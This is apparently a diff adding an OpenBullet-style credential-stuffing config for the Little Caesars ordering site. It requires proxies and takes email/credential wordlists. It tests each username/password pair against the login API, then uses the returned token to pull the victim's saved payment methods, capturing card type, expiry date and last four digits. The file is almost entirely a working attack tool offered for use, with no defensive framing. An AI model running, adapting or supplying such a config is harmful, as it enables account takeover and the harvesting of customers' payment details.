@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "littlecaesars",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-17T18:30:35.0305092-05:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578 Improved By Oblivyan",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Email",
+  "AllowedWordlist2": "Credentials",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.cloud.littlecaesars.com/bff/api/account/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Cache-Control: no-cache, max-age=0" 
+  HEADER "Origin: https://order.littlecaesars.com" 
+  HEADER "Referer: https://order.littlecaesars.com/en-us/login?referrer=https://littlecaesars.com/en-us/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "succeeded\":true" 
+  KEYCHAIN Failure OR 
+    KEY "succeeded\":false" 
+    KEY "Email or password is incorrect" 
+
+PARSE "<SOURCE>" JSON "jwt" -> VAR "JWT" 
+
+REQUEST GET "https://api.cloud.littlecaesars.com/bff/api/paymentMethods" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <JWT>" 
+
+PARSE "<SOURCE>" JSON "cardType" -> CAP "Card Type" 
+
+PARSE "<SOURCE>" JSON "cardExpDate" -> CAP "EXP Date" 
+
+PARSE "<SOURCE>" LR "hashedPaymentNumber\":\"XXXX-XXXX-XXXX-" "\",\"" -> CAP "LAST 4" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "No payment information found" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "No payment information found" 
+
